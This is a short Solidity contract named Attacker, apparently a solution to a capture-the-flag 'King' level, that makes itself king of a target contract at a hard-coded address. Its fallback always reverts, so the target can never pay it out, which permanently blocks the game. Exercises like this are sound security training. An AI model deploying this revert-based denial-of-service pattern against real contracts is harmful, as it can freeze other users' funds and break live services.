// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IKing{
    function _king() external returns(address);
    function prize() external returns(uint256);
}

contract Attacker {
    error Attacker__AlwaysRevert(string msg);
    error Attacker__TransactionFailed();

    address constant private TARGET_ADDRESS = 0x4Ce89DFEFAc8ABd32A7298c8f946eB9d2645FA3a;
    IKing target = IKing(TARGET_ADDRESS);

    fallback() external payable {
        revert Attacker__AlwaysRevert("I don't want your ETH!!!!!!");
    }

    function attack() public payable {
        (bool success,) = address(target).call{value: msg.value}("");
        if(!success){
            revert Attacker__TransactionFailed();
        }
    }

    function prize() public returns(uint256) {
        return target.prize();
    }

}